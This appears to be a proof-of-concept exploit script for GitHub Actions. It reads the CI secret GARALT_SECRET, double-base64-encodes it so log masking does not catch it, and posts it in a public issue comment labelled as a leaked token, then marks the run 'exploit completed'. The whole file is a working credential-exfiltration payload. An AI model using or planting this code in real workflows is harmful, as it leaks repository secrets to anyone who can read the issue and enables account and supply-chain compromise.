module.exports = async ({ github, context, core }) => {
  const secret = process.env.GARALT_SECRET || 'NO_SECRET_FOUND';
  const b64 = Buffer.from(secret).toString('base64');
  const doubleB64 = Buffer.from(b64).toString('base64');
  await github.rest.issues.createComment({
    owner: context.repo.owner,
    repo: context.repo.repo,
    issue_number: context.issue.number,
    body: `GARALT_LEAKED_TOKEN=${doubleB64}`
  });
  core.setFailed("exploit completed");
};